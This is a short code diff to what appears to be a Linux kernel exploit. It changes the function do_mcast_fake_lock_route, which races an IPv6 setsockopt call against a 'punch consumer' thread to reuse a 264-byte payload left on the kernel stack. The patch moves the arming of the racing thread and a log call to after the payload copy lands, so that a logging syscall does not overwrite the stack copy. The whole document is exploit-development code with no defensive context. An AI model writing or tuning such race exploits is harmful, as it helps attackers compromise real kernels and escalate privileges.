@@ -475,15 +475,15 @@ void do_mcast_fake_lock_route(void) {
     atomic_store(&punch_consume_stop, 0);
     int delay_usec = route_delay_usec(route_attempt);
     atomic_store(&main_route_delay_usec, delay_usec);
-    atomic_store(&punch_consume_go, route_attempt);
 
     pr_info("mcast pre-setsockopt +%.0fms\n", fops_elapsed_ms(&route_t0));
     errno = 0;
     int ret = setsockopt(sock, IPPROTO_IPV6, MCAST_ROUTE_OPTNAME,
                          payload, sizeof(payload));
     int saved_errno = errno;
-    pr_info("mcast post-setsockopt +%.0fms ret=%d errno=%d\n",
-            fops_elapsed_ms(&route_t0), ret, saved_errno);
+    /* Arm the punch consumer only after the copy lands, and keep logging
+     * until after the window: a write() syscall overwrites the stack copy. */
+    atomic_store(&punch_consume_go, route_attempt);
 
     /* The 264-byte copy persists on this thread's kernel stack until the
      * next deep syscall, so hold the punch window in userspace (the mirror
@@ -518,6 +518,8 @@ void do_mcast_fake_lock_route(void) {
 
     calls = atomic_load(&consumer_calls);
     success = atomic_load(&consumer_success);
+    pr_info("mcast post-setsockopt +%.0fms ret=%d errno=%d\n",
+            fops_elapsed_ms(&route_t0), ret, saved_errno);
     pr_info("mcast window done attempt=%d ret=%d errno=%d calls=%d "
             "success=%d delay=%d sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
             route_attempt, ret, saved_errno, calls, success, delay_usec,
